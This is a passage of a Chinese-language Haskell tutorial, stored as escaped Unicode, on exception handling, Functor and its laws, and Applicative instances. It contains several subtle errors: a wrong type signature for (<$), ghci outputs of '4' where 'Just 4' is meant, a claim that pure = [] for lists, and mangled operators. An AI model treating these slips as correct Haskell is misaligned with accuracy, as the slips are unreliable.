\u5f02\u5e38\u7684\u7c7b\u578b\u6765\u8fdb\u884c\u4e0d\u540c\u64cd\u4f5c\uff1a import System.Environment import System.IO.Error import Control.Exception main = toTry ` catch ` handler toTry :: IO () toTry = do ( fileName : _ ) <- getArgs contents <- readFile fileName putStrLn $ \"The file has \" ++ show ( length ( lines contents )) ++ \" lines!\" handler :: IOError -> IO () handler e | isDoesNotExistError e = putStrLn \"The file doesn't exist!\" | otherwise = ioError e \u5177\u4f53\u76f8\u5173\u5168\u90e8\u51fd\u6570\u89c1\u6587\u6863\uff1a System.IO.Error \u3001 Control.Exception Functors \u00b6 \u51fd\u5b50\uff08Functor\uff09\u662f\u4e00\u4e2a\u7c7b\u578b\u7c7b\uff08typeclass\uff09\uff0c\u548c\u5176\u4ed6\u7c7b\u578b\u7c7b\u4e00\u6837\uff0c\u5b83\u89c4\u5b9a\u4e86\u5176\u5b9e\u4f8b\u7c7b\u5fc5\u987b\u5b9e\u73b0\u7684\u529f\u80fd\uff08\u4f8b\u5982 Eq \u7c7b\u578b\u7c7b\u89c4\u5b9a\u4e86\u5b83\u7684\u5b9e\u4f8b\u5fc5\u987b\u662f\u53ef\u4ee5\u6bd4\u8f83\u662f\u5426\u76f8\u7b49\u7684\uff09\uff0cFunctor \u89c4\u5b9a\u7c7b\u5b83\u7684\u5b9e\u4f8b\u5fc5\u987b\u662f\u53ef\u4ee5\u8fdb\u884c\u6620\u5c04\u7684\u3002Functor \u8981\u6c42\u4f7f\u7528 fmap :: (a -> b) -> f a -> f b \u51fd\u6570\u6765\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a a -> b \u7c7b\u578b\u7684\u51fd\u6570\u3001\u4e00\u4e2a\u5185\u90e8\u5143\u7d20\u4e3a a \u7c7b\u578b\u7684\u51fd\u5b50\uff0c\u8fd4\u56de\u4e00\u4e2a\u5185\u90e8\u5143\u7d20\u4e3a b \u7c7b\u578b\u7684\u51fd\u5b50 Functor \u53ef\u4ee5\u6bd4\u4f5c\u76d2\u5b50\uff0c\u90a3 fmap \u51fd\u6570\u5c31\u76f8\u5f53\u4e8e\u7ed9\u5b9a\u4e00\u4e2a\u51fd\u6570\u548c\u4e00\u4e2a\u76d2\u5b50\uff0c\u5c06\u76d2\u5b50\u4e2d\u7684\u5168\u90e8\u5143\u7d20\u90fd\u5e94\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u518d\u8fd4\u56de\u5e94\u7528\u51fd\u6570\u540e\u7684\u76d2\u5b50 \u51fd\u5b50\u7684\u5b9e\u4f8b\u5fc5\u987b\u662f\u4e00\u4e2a Kind \u4e3a * -> * \u7684\u7c7b\u578b\u6784\u9020\u5668\uff0c\u56e0\u4e3a\u5b83\u8981\u6c42\u5176\u662f\u4e00\u4e2a\u76d2\u5b50\uff0c\u76d2\u5b50\u5728\u63a5\u6536\u5185\u5bb9\u540e\u624d\u4f1a\u6210\u4e3a\u4e00\u4e2a\u5177\u4f53\u7684\u7c7b\u578b\u3002fmap \u4e2d\u7684 f a \u548c f b \u4e5f\u662f\u56e0\u4e3a f \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u5728\u63a5\u6536\u7c7b\u578b a/b \u540e\u624d\u4f1a\u53d8\u6210\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff08f a \u548c f b\uff09\u51fa\u73b0\u5728\u51fd\u6570\u7c7b\u578b\u58f0\u660e\u4e2d Functor \u7684\u5b9a\u4e49\u662f: class Functor f where fmap :: ( a -> b ) -> f a -> f b ( <$ ) :: a -> f a -> f b ( <$ ) = fmap . const \u53ef\u4ee5\u53d1\u73b0 Functor \u4e0d\u4ec5\u9700\u8981 fmap \u51fd\u6570\uff0c\u8fd8\u9700\u8981\u4e00\u4e2a <$ \u51fd\u6570\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a a \u7c7b\u578b\u7684\u53d8\u91cf\u548c\u4e00\u4e2a\u5185\u5bb9\u4e3a b \u7c7b\u578b\u7684\u51fd\u5b50\uff0c\u8fd4\u56de\u4e00\u4e2a\u5185\u5bb9\u4e3a a \u7c7b\u578b\u7684\u51fd\u5b50\uff1b\u4f5c\u7528\u5c31\u662f\u5c06\u4f20\u5165\u7684\u51fd\u5b50\u4e2d\u7684\u6240\u6709\u5143\u7d20\u90fd\u66ff\u6362\u4e3a\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u6bd4\u5982\uff1a ghci > 'a' <$ [ 1 , 2 , 3 ] \"aaa\" \u4f46\u5b83\u4e0d\u662f\u58f0\u660e\u4e00\u4e2a\u51fd\u5b50\u5b9e\u4f8b\u5fc5\u987b\u7684\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u4f7f\u7528 fmap \u548c const \u51fd\u6570\u590d\u5408\u6765\u5b9e\u73b0\uff0c\u5176\u4e2d const \u7684\u7c7b\u578b\u7b7e\u540d\uff1a const :: a -> b -> a \u5373\u63a5\u6536\u4e24\u4e2a\u53c2\u6570\uff0c\u4f46\u59cb\u7ec8\u53ea\u8fd4\u56de\u7b2c\u4e00\u4e2a\u53c2\u6570 Functor \u5b9e\u4f8b \u00b6 [] \u00b6 \u5217\u8868 [] \u662f\u4e00\u4e2a\u51fd\u5b50\uff0c\u5b83\u901a\u8fc7 map \u51fd\u6570\u6765\u5b9e\u73b0 fmap \u7684\u529f\u80fd\uff1a instance Functor [] where fmap = map map :: (a -> b) -> [a] -> [b] map \u548c fmap \u8981\u6c42\u7684\u76f8\u540c\uff0c\u8fbe\u6210\u7684\u76ee\u7684\u4e5f\u4e00\u81f4\u3002map \u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u548c\u4e00\u4e2a\u5217\u8868\uff0c\u5b83\u4f1a\u5c06\u5217\u8868\u4e2d\u7684\u6240\u6709\u5143\u7d20\u90fd\u5e94\u7528\u8fd9\u4e2a\u51fd\u6570\u540e\u518d\u8fd4\u56de\u8fd9\u4e2a\u5217\u8868 Maybe \u00b6 Maybe \u4e5f\u5177\u6709 kind * -> *\uff0c\u5b83\u4e5f\u662f\u4e00\u4e2a\u51fd\u5b50\uff1a instance Functor Maybe where fmap f Nothing = Nothing fmap f ( Just x ) = Just ( f x ) ghci > fmap ( * 2 ) Nothing Nothing ghci > fmap ( * 2 ) ( Just 2 ) Just 4 Either a \u00b6 Either \u7684 kind \u662f* -> * -> *\uff0c\u663e\u7136\u5b83\u4e0d\u662f\u51fd\u5b50\uff0c\u4f46\u662f\u56fa\u5b9a\u4e86\u4e00\u4e2a\u4f20\u5165\u7c7b\u578b\u7684 Either a \u7684 kind \u662f* -> *\uff0c\u4e5f\u662f\u4e00\u4e2a\u51fd\u5b50\uff1a instance Functor ( Either a ) where fmap f ( Left x ) = Left x fmap f ( Right x ) = Right ( f x ) ghci > fmap ( * 2 ) ( Left 4 ) Left 4 ghci > fmap ( * 2 ) ( Right 4 ) Right 8 \u56e0\u4e3a\u4f7f\u7528 Either \u65f6\u4e00\u822c\u7528\u53f3\u503c\u8868\u793a\u6b63\u5e38\u7ed3\u679c\uff0c\u5de6\u503c\u8868\u793a\u5f02\u5e38\u4fe1\u606f\uff0c\u6240\u4ee5\u4f7f\u7528 fmap \u65f6\u53ea\u5bf9\u53f3\u503c\u8fdb\u884c\u64cd\u4f5c\uff0c\u5982\u679c\u65f6\u5de6\u503c\u5219\u4fdd\u6301\u4e0d\u53d8\uff08\u800c\u4e14\u5de6\u503c\u6b64\u65f6\u4e5f\u4f5c\u4e3a\u786e\u5b9a\u7c7b\u578b\u786e\u5b9a\u503c\u5b58\u5728\uff09 IO \u00b6 IO \u4e5f\u662f\u4e00\u4e2a\u51fd\u5b50\uff0c\u4f7f\u7528 fmap \u5bf9 IO \u4e2d\u5185\u5bb9\u5e94\u7528\u51fd\u6570\uff1a instance Functor IO where fmap f action = do result <- action return ( f result ) ghci > fmap ( \"input: \" ++ ) getLine test \"input: test\" (,) a \u00b6 (,) \u8868\u793a\u4e00\u4e2a\u4e8c\u5143\u7ec4\u7684\u7c7b\u578b\u6784\u9020\u5668\uff0c(,) :: * -> * -> *\uff0c\u800c\u786e\u5b9a\u4e86\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684\u7c7b\u578b\u540e\u5c31\u53d8\u6210\u4e86 (,) a\uff0c\u5b83\u7684 kind \u662f * -> *\u3002\u4e5f\u662f\u4e00\u4e2a\u51fd\u5b50\uff0c\u8fdb\u884c fmap \u51fd\u6570\u65f6\u53ea\u5bf9\u7b2c\u4e8c\u4e2a\u5143\u7d20\u5e94\u7528\uff1a instance Functor ((,) a ) where fmap f ( x , y ) = ( x , f y ) \u53ea\u5269\u4e00\u4e2a\u5143\u7d20\u7684\u4e09\u5143\u7ec4\u548c\u56db\u5143\u7ec4\u4e5f\u90fd\u662f\u51fd\u5b50\uff0cfmap \u4e5f\u53ea\u5bf9\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5e94\u7528\uff1a instance Functor ((,,) a b ) where fmap f ( a , b , c ) = ( a , b , f c ) instance Functor ((,,,) a b c ) where fmap f ( a , b , c , d ) = ( a , b , c , f d ) (->) r \u00b6 -> \u4e5f\u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u5b83\u7684 kind\uff1a (->) :: * -> * -> * \u4e00\u4e2a\u6620\u5c04\uff08\u4e00\u5143\u51fd\u6570\uff09\u7684\u7c7b\u578b a -> b \u4e5f\u53ef\u4ee5\u5199\u6210 (->) a b\uff0c\u5b83\u662f\u7531\u7c7b\u578b a \u548c\u7c7b\u578b b \u8f93\u5165\u5230\u7c7b\u578b\u6784\u9020\u5668 -> \u4e2d\u540e\u5f62\u6210\u7684\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\u3002\u6240\u4ee5\u786e\u5b9a\u4e86\u8f93\u5165\u7c7b\u578b\u540e\u7684\u4e00\u5143\u51fd\u6570\u7684\u7c7b\u578b\u5c31\u662f (->) r\uff08\u5176\u4e2d r \u662f\u8f93\u5165\u7684\u7c7b\u578b\uff09 \u89c4\u5b9a\u7684 fmap \u7684\u7c7b\u578b\u7b7e\u540d\u662f\uff1a fmap :: (a -> b) -> f a -> f b \u5176\u4e2d\u7684 f \u662f\u51fd\u5b50\uff0c\u800c\u5728\u8fd9\u4e2a\u5b9e\u4f8b\u4e2d (->) r \u5c31\u662f\u51fd\u5b50\uff0c\u5c06\u5176\u5e26\u5165 f \u53ef\u4ee5\u5f97\u5230\uff1a fmap :: (a -> b) -> ((-> r) a) -> ((-> r) b) \u628a\u5176\u4e2d\u7684 (->) \u6362\u6210\u4e2d\u7f00\u53ef\u4ee5\u5f97\u5230\uff1a fmap :: (a -> b) -> (r -> a) -> (r -> b) \u4f20\u5165\u4e24\u4e2a\u51fd\u6570\uff0c\u4e00\u4e2a\u7c7b\u578b\u4e3a a -> b\uff0c\u4e00\u4e2a\u7c7b\u578b\u4e3a r -> a\uff0c\u8fd4\u56de\u4e00\u4e2a\u51fd\u6570\uff0c\u7c7b\u578b\u4e3a r -> b\u3002 \u4e0d\u96be\u63a8\u6d4b\u8fd9\u4e2a fmap \u662f\u5c06\u8fd9\u4e24\u4e2a\u51fd\u6570\u590d\u5408\u4e86\uff0c\u5148\u5bf9\u8f93\u5165\u5bf9 r \u5e94\u7528\u7b2c\u4e8c\u4e2a\u51fd\u6570\u4ea7\u751f\u7c7b\u578b a \u7684\u7ed3\u679c\uff0c\u7136\u540e\u5728\u5e94\u7528\u7b2c\u4e00\u4e2a\u51fd\u6570\u4ea7\u751f\u7c7b\u578b b \u7684\u7ed3\u679c\uff0c\u6240\u4ee5 (->) r \u5b9a\u4e49\u7684 fmap \u662f\uff1a instance Functor (( -> ) r ) where fmap f g = ( \\ x -> f ( g x )) \u6240\u4ee5 (->) r \u7684 fmap \u5176\u5b9e\u5c31\u662f\u51fd\u6570\u590d\u5408 (.)\uff1a instance Functor (( -> ) r ) where fmap = ( . ) ghci > : t fmap ( * 3 ) ( + 100 ) fmap ( * 3 ) ( + 100 ) :: ( Num a ) => a -> a ghci > fmap ( * 3 ) ( + 100 ) 1 303 ghci > ( * 3 ) ` fmap ` ( + 100 ) $ 1 303 ghci > ( * 3 ) . ( + 100 ) $ 1 303 Functor Laws \u00b6 \u6240\u6709\u7684\u51fd\u5b50\u90fd\u5e94\u8be5\u6ee1\u8db3\u4e24\u4e2a\u5b9a\u5f8b\u3002\u8fd9\u4e24\u4e2a\u5b9a\u5f8b\u4e0d\u662f Haskell \u5f3a\u5236\u8981\u6c42\u7684\uff0c\u4f46\u5e94\u8be5\u786e\u4fdd\u4e00\u4e2a\u51fd\u5b50\u6ee1\u8db3\u8fd9\u4e24\u4e2a\u5b9a\u5f8b\uff1a fmap id = id \uff08\u5176\u4e2d id \u4e3a\u51fd\u6570 (\\x -> x) \uff09\uff1a\u5373\u5bf9\u4e00\u4e2a\u51fd\u5b50 fmap id\uff0c\u90a3\u5b83\u5e94\u8be5\u8fd4\u56de\u672c\u8eab\uff08fmap id a = id a = a\uff0ca \u4e3a\u4e00\u4e2a\u51fd\u5b50\uff09\uff0c\u6bd4\u5982\uff1a ghci > fmap id [ 1 , 2 , 3 ] [ 1 , 2 , 3 ] ghci > fmap id ( Just 2 ) Just 2 fmap (f . g) = fmap f . fmap g \uff1a\u5373\u51fd\u5b50\u7684 fmap \u652f\u6301\u7ed3\u5408\u5f8b fmap (f . g) a = fmap f . fmap g $ a = fmap f (fmap g a)\uff0c\u5176\u4e2d a \u4e3a\u4e00\u4e2a\u51fd\u5b50 fmap (f . g) (Just x) = fmap f (fmap g (Just x)) = fmap f (Just (g x)) = Just (f (g x)) ghci > fmap (( * 3 ) . ( + 100 )) ( Just 1 ) Just 303 \u6ee1\u8db3\u7b2c\u4e00\u4e2a\u5b9a\u5f8b\u7684\u51fd\u5b50\u4e00\u5b9a\u6ee1\u8db3\u7b2c\u4e8c\u4e2a\u5b9a\u5f8b\uff0c\u6240\u4ee5\u53ea\u8981\u68c0\u67e5\u51fd\u5b50\u662f\u5426\u6ee1\u8db3\u7b2c\u4e00\u4e2a\u5b9a\u5f8b\u5373\u53ef Intuition \u00b6 \u5bf9\u4e8e\u51fd\u5b50\u548c fmap\uff0c\u6709\u4e24\u79cd\u7406\u89e3\u65b9\u6cd5 \u51fd\u5b50\u662f\u4e00\u79cd\u5bb9\u5668\uff08container\uff09\uff1bfmap \u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u548c\u4e00\u4e2a\u5bb9\u5668\uff0c\u5728\u5bb9\u5668\u5185\u90e8\u5e94\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u8fd4\u56de\u5e94\u7528\u540e\u7684\u65b0\u5bb9\u5668 \u51fd\u5b50\u662f\u4e00\u79cd\u8ba1\u7b97\u4e0a\u4e0b\u6587\uff08context\uff09\uff1bfmap \u662f\u67ef\u91cc\u5316\u7684\uff0c\u628a\u5176\u7c7b\u578b\u7b7e\u540d\u770b\u4f5c fmap :: (a -> b) -> (f a -> f b) \u2003\u2003\u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u8fd4\u56de\u53e6\u4e00\u4e2a\u51fd\u6570\uff0c\u4f20\u5165\u51fd\u6570 g :: a -> b\uff0cfmap \u5c06\u5176\u8f6c\u6362\u4e3a\u65b0\u7684\u51fd\u6570 fmap g :: f a -> f b \u2003\u2003\u4f7f\u666e\u901a\u7684\u51fd\u6570 g \u53ef\u4ee5\u5728\u8ba1\u7b97\u4e0a\u4e0b\u6587 f \u4e2d\u4f7f\u7528\uff0c\u8fd9\u79cd\u8f6c\u6362\u4e5f\u88ab\u79f0\u4e3a\u63d0\u5347\uff08lift\uff09 \u5e38\u7528\u51fd\u6570 \u00b6 <$> \u00b6 <$> \u51fd\u6570\u662f fmap \u7684\u4e2d\u7f00\u5f62\u5f0f\uff08\u5b83\u770b\u7740\u7c7b\u4f3c $ \uff0c f $ 3 \u5c06 f \u5e94\u7528\u5728\u5355\u4e2a\u503c 3 \u4e0a\uff0c\u800c f <$> [1, 2, 3] \u5c06 f \u5e94\u7528\u5728\u4e00\u4e2a\u51fd\u5b50\u4e0a\uff0c\u4e5f\u5c31\u662f\u5e94\u7528\u5728\u4e00\u4e2a\u51fd\u5b50\u5185\u90e8\u7684\u6240\u6709\u503c\u4e0a\uff09\uff1a ghci > fmap ( * 2 ) ( Just 2 ) 4 ghci > ( * 2 ) <$> Just 2 4 $> \u00b6 $> \u51fd\u6570\u5305\u542b\u5728 Data.Functor \u6a21\u5757\u4e2d ($>) :: Functor f => f a -> b -> f b Functor \u5b9a\u4e49\u65f6\u8981\u6c42\u4e86 <$ \u51fd\u6570\uff0c\u5c06\u51fd\u5b50\u5185\u90e8\u7684\u5143\u7d20\u5168\u90e8\u66ff\u6362\u4e3a\u6307\u5b9a\u7684\u67d0\u4e2a\u503c\uff0c\u800c $> \u6b63\u597d\u5c06 <$ \u51fd\u6570\u7684\u4e24\u4e2a\u53c2\u6570\u53cd\u4e86\u8fc7\u6765\uff0c\u76f8\u5f53\u4e8e flip (<$) \uff1a ghci > 'a' <$ [ 1 , 2 , 3 ] \"aaa\" ghci > [ 1 , 2 , 3 ] $> 'a' \"aaa\" void \u00b6 void \u51fd\u6570\u4e5f\u5305\u542b\u5728 Data.Functor \u6a21\u5757\u4e2d void :: Functor f => f a -> f () void \u51fd\u6570\u628a\u4e00\u4e2a\u51fd\u5b50\u5185\u90e8\u7684\u5168\u90e8\u5143\u7d20\u90fd\u53d8\u6210\u7a7a\uff08 () \uff09\uff0c void x \u76f8\u5f53\u4e8e () <$ x \uff1a ghci > void [ 1 , 2 , 3 ] [ () , () , () ] ghci > void ( Just 2 ) Just () Applicative Functor \u00b6 \u5e94\u7528\u51fd\u5b50\uff08Applicative Functor\uff09\u662f\u51fd\u5b50\u7684\u5347\u7ea7\u7248\uff0c\u5b83\u5305\u542b\u5728 Control.Applicative \u6a21\u5757\u4e2d\u3002 fmap \u8fdb\u884c\u7684\u64cd\u4f5c\u662f\u5c06\u4e00\u4e2a\u666e\u901a\u4e00\u5143\u51fd\u6570\u5e94\u7528\u5728\u4e00\u4e2a\u51fd\u5b50\u5185\u90e8\u3002\u800c\u5982\u679c\u8981\u5c06\u4e00\u4e2a\u5305\u542b\u51fd\u6570\u7684\u51fd\u5b50\u5e94\u7528\u5728\u53e6\u4e00\u4e2a\u51fd\u5b50\u4e0a\uff0cfmap \u5c31\u5904\u7406\u4e0d\u4e86\u4e86\uff0c\u4f46\u662f\u5e94\u7528\u51fd\u5b50\u7684\u65b9\u6cd5\u53ef\u4ee5\u5904\u7406\u3002\u5e94\u7528\u51fd\u5b50\u7684\u5b9a\u4e49\uff1a class Functor f => Applicative f where pure :: a -> f a ( <*> ) :: f ( a -> b ) -> f a -> f b \u5e94\u7528\u51fd\u5b50\u8981\u6c42\u5b9e\u73b0\u4e24\u4e2a\u51fd\u6570\uff1a pure :: a -> f a\uff0c\u4e0d\u96be\u7406\u89e3\uff0cpure \u63a5\u6536\u4e00\u4e2a\u503c\uff0c\u5e76\u5c06\u5176\u653e\u5728\u9ed8\u8ba4\u7684\u4e0a\u4e0b\u6587/\u5bb9\u5668\u4e2d\u3002\u5bf9\u4e8e\u5217\u8868\uff0cpure = []\uff1b\u5bf9\u4e8e Maybe\uff0cpure = Just <*> :: f (a -> b) -> f a -> f b\uff0c\u7c7b\u4f3c\u4e8e fmap :: (a -> b) -> f a -> f b\uff0c\u4f46\u4e0d\u540c\u7684\u662f <*> \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u7c7b\u578b\u662f f (a -> b) \u4e0d\u662f a -> b\u3002\u6240\u4ee5 <*> \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u51fd\u6570\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u666e\u901a\u51fd\u6570\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c<*> \u63a5\u6536\u4e00\u4e2a\u88c5\u6709\u51fd\u6570\u7684\u51fd\u5b50\u548c\u53e6\u4e00\u4e2a\u51fd\u5b50\uff0c\u5e94\u7528\u51fd\u6570\u540e\u8fd4\u56de\u65b0\u7684\u51fd\u5b50\u3002 Applicative Functor \u5b9e\u4f8b \u00b6 Maybe \u00b6 Maybe \u662f\u4e00\u4e2a\u5e94\u7528\u51fd\u5b50\uff1a instance Applicative Maybe where pure = Just Nothing <*> _ = Nothing ( Just f ) <*> something = fmap f something pure \u51fd\u6570\uff1a\u5c06\u4e00\u4e2a\u503c\u653e\u5728\u9ed8\u8ba4\u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u800c\u5bf9\u4e8e Maybe\uff0c\u9ed8\u8ba4\u7684\u4e0a\u4e0b\u6587\u5c31\u662f Just\uff0c\u6240\u4ee5 pure x = Just x <*> \u51fd\u6570\uff1a\u5c06\u88c5\u6709\u51fd\u6570\u7684\u51fd\u5b50\u4e2d\u7684\u51fd\u6570\u5e94\u7528\u53e6\u4e00\u4e2a\u51fd\u5b50\u4e2d \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f Nothing\uff0c\u5373\u7b2c\u4e00\u4e2a\u51fd\u5b50\u4e0d\u5305\u542b\u51fd\u6570\uff0c\u90a3\u8fd4\u56de\u7684\u7ed3\u679c\u5c31\u4e5f\u4f1a\u662f Nothing \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u88c5\u6709\u51fd\u6570f\u7684\u51fd\u5b50 Just f\uff0c\u5c06\u5176\u4e2d\u7684\u51fd\u6570f\u5e94\u7528\u5728\u51fd\u5b50 something \u4e2d\uff0c\u53ea\u9700\u8981\u5c06 f \u63d0\u53d6\u51fa\u6765\u4f7f\u7528 fmap \u5e94\u7528\u5728\u51fd\u5b50 something \u4e2d\u5373\u53ef \u5b9e\u9645\u5e94\u7528\u7684\u4f8b\u5b50\uff1a ghci > Just ( + 3 ) <*> Just 9 Just 12 ghci > pure ( + 3 ) <*> Just 9 Just 12 ghci > ( + 3 ) <$> Just 9 Just 12 ghci > Nothing <*> Just 9 Nothing \u7b2c\u4e00\u4e2a\u4f8b\u5b50\uff0cJust (+3) \u662f\u4e00\u4e2a\u5305\u542b\u51fd\u6570 (+3) \u7684\u51fd\u5b50\uff0c\u5c06\u5176\u5e94\u7528\u5728\u51fd\u5b50 Just 9 \u4e2d\uff0c\u5c06 Just (+3) \u4e2d\u7684\u51fd\u6570 (+3) \u63d0\u53d6\u51fa\u6765\uff0c\u5e94\u7528\u5728 Just 9 \u4e2d\uff0c\u5f97\u5230\u4e86 Just 12 \u7b2c\u4e8c\u4e2a\u4f8b\u5b50\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u5728\u8fd9\u91cc pure (+3) \u548c Just (+3) \u7b49\u6548\uff0c\u56e0\u4e3a pure \u5c06\u51fd\u6570 (+3) \u653e\u5728\u9ed8\u8ba4\u4e0a\u4e0b\u6587\u4e2d\uff0c\u4e5f\u5c31\u662f Just \u4e2d\u4e86 \u800c <*> \u80fd\u505a\u7684\u4e0d\u6b62\u8fd9\u4e9b\uff0c\u4ed6\u53ef\u4ee5\u8fde\u7eed\u4f20\u5165\u66f4\u591a\u51fd\u5b50\u4f5c\u4e3a\u53c2\u6570\uff0c\u6bd4\u5982\uff1a ghci > pure ( + ) <*> Just 3 <*> Just 9 Just 12 ghci > pure ( \\ x y z -> x + y + z ) <*> Just 3 <*> Just 4 <*> Just 5 Just 12 <*> \u51fd\u6570\u4e00\u6837\u662f\u9ed8\u8ba4\u5de6\u7ed3\u5408\u7684\uff0cpure (+) < > Just 3 < > Just 9 \u76f8\u5f53\u4e8e (pure (+) < > Just 3) < > Just 9\uff0c\u800c pure (+) < > Just 3 \u5c06 (+) \u5e94\u7528\u5728Just 3 \u4e0a\uff0c\u5f97\u5230\u7684\u5c31\u662f Just (+3) \u4e00\u4e2a\u5305\u542b\u51fd\u6570\u7684\u51fd\u5b50\uff0c\u53c8\u5c06\u5176\u901a\u8fc7 < > \u5e94\u7528\u5728\u4e86 Just 9 \u4e0a\uff0c\u5f97\u5230\u4e86 Just 12: pure ( \\ x y z -> x + y + z ) <*> Just 3 <*> Just 4 <*> Just 5 = ( pure ( \\ x y z -> x + y + z ) <*> Just 3 ) <*> Just 4 <*> Just 5 = ( Just ( \\ y z -> 3 + y + z ) <*> Just 4 ) <*> Just 5 = Just ( \\ z -> 3 + 4 + z ) <*> Just 5 = Just ( + 7 ) <*> Just 5 = Just 12 \u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c pure f < > x < > y <*> ... \u6765\u5c06\u4e00\u4e2a\u666e\u901a\u591a\u5143\u51fd\u6570f\u5e94\u7528\u5728\u591a\u4e2a\u51fd\u5b50\u4e0a\u3002 \u800c\u4e14 pure f < > x \u5b9e\u9645\u4e0a\u5148\u5c06\u666e\u901a\u51fd\u6570f\u653e\u5728\u4e0a\u4e0b\u6587\u4e2d\uff0c\u7136\u540e\u6267\u884c < > \u65f6\u518d\u5c06\u5176\u63d0\u53d6\u51fa\u6765\u6267\u884c fmap\uff0c\u6240\u4ee5\u5b83\u5c31\u76f8\u5f53\u4e8e\u5c06\u666e\u901a\u51fd\u6570\u5e94\u7528\u5728\u51fd\u5b50 x \u4e0a\uff0c\u5373 fmap f x\uff0c\u4e5f\u53ef\u4ee5\u5199\u6210 f <$> x\u3002\u6240\u4ee5\u5e38\u7528\u7684\u5199\u6cd5\u5c31\u662f\uff1a f < $> x < *> y < *> ... [] \u00b6 \u5217\u8868\u4e5f\u662f\u4e00\u4e2a\u5e94\u7528\u51fd\u5b50\uff1a instance Applicative [] where pure x = [ x ] fs <*> xs = [ f x | f <- fs , x <- xs ] - pure \u51fd\u6570\uff1a\u5bf9\u4e8e\u5217\u8868\u800c\u8a00\uff0c\u4e00\u4e2a\u503c\u7684\u6700\u5c0f\u4e0a\u4e0b\u6587\u5c31\u662f\u53ea\u5305\u542b\u8fd9\u4e2a\u503c\u7684\u5217\u8868 [x] - <*> \u51fd\u6570\uff1a\u5217\u8868\u7684 <*> \u51fd\u6570\u662f\u901a\u8fc7\u5217\u8868\u63a8\u5bfc\u6765\u5b9e\u73b0\u7684\u3002\u56e0\u4e3a\u4e0d\u540c\u4e8e Maybe \u7684 Just \u53ea\u5305\u542b\u4e00\u4e2a\u503c\uff0c\u5217\u8868\u53ef\u4ee5\u5305\u542b\u5f88\u591a\u503c\uff0c\u7b2c\u4e00\u4e2a\u4f20\u5165\u7684\u5217\u8868\u4e2d\u53ef\u80fd\u4f1a\u5305\u542b\u5f88\u591a\u51fd\u6570\uff0c\u7b2c\u4e8c\u4e2a\u4f20\u5165\u7684\u5217\u8868\u4e5f\u4f1a\u5305\u542b\u5f88\u591a\u503c\uff0c\u6240\u4ee5\u5c31\u9700\u8981\u5148\u4ece\u7b2c\u4e00\u4e2a\u5217\u8868\u4e2d\u53d6\u51fa\u4e00\u4e2a\u51fd\u6570\u7136\u540e\u4f9d\u6b21\u5e94\u7528\u5728\u7b2c\u4e8c\u4e2a\u5217\u8868\u7684\u6bcf\u4e2a\u503c\u4e2d\uff0c\u518d\u53d6\u51fa\u7b2c\u4e00\u4e2a\u5217\u8868\u4e2d\u7684\u7b2c\u4e8c\u4e2a\u51fd\u6570\u5e94\u7528\u5728\u7b2c\u4e8c\u4e2a\u5217\u8868\u7684\u6bcf\u4e2a\u503c\u4e2d\u2026\u2026\u6700\u7ec8\u8fd4\u56de\u5f97\u5230\u7684\u6240\u6709\u7ed3\u679c\u7684\u5217\u8868 \u4f7f\u7528\u4f8b\u5b50\uff1a ghci > [( + 3 ), ( * 2 )] <*> [ 1 , 2 ] [ 4 , 5 , 2 , 4 ] ghci > [( + ), ( * )] <*> [ 1 , 2 ] <*> [ 3 , 4 ] [ 4 , 5 , 5 , 6 , 3 , 4 , 6 , 8 ] IO \u00b6 instance Applicative IO where pure = return a <*> b = do f <- a x <- b return ( f x ) \u4e5f\u4e0d\u96be\u7406\u89e3\uff0cpure \u51fd\u6570\u76f4\u63a5\u5c06\u4f20\u5165\u7684\u503c return\uff0c\u76f8\u5f53\u4e8e\u653e\u5728\u4e86 IO \u7684\u4e0a\u4e0b\u6587\u4e2d\u3002\u800c <*> \u51fd\u6570\u5148\u5c06\u4e24\u4e2a IO \u4e2d\u5185\u5bb9\u63d0\u53d6\u51fa\u6765\uff0c\u7136\u540e\u5e94\u7528\u51fd\u6570\u540e return\uff0c\u5f62\u6210\u65b0\u7684 IO \u51fd\u5b50 ghci > ( ++ ) <$> getLine <*> getLine Line1 Line2 \"Line1Line2\" (->) r \u00b6 (->) r \u540c\u6837\u4e5f\u662f\u4e00\u4e2a\u5e94\u7528\u51fd\u5b50\uff0c\u548c\u51fd\u5b50\u7684\u5206\u6790\u4e00\u6837\uff0c\u5148\u6765\u5206\u6790\u5b83\u7684 <*> \u51fd\u6570\u7684\u7c7b\u578b\u7b7e\u540d\uff1a < *> :: f (a -> b) -> f a -> f b \u5176\u4e2d f \u4e3a (->) r\uff0c\u5c06\u5176\u4ee3\u5165\u5e76\u66ff\u6362\u4e3a\u4e2d\u7f00\uff1a < *> :: (r -> a -> b) -> (r -> a) -> (r -> b) \u53ef\u4ee5\u770b\u51fa\u5b83\u63a5\u6536\u4e24\u4e2a\u51fd\u6570 f :: r -> a -> b\u3001g :: r -> a\uff0c\u8fd4\u56de\u53e6\u4e00\u4e2a\u51fd\u6570 h :: (r -> b) \u90a3\u4e48\u8fd4\u56de\u7684\u51fd\u6570\u7684\u8f93\u5165\u4e3a r\uff0c\u8f93\u51fa\u4e3a 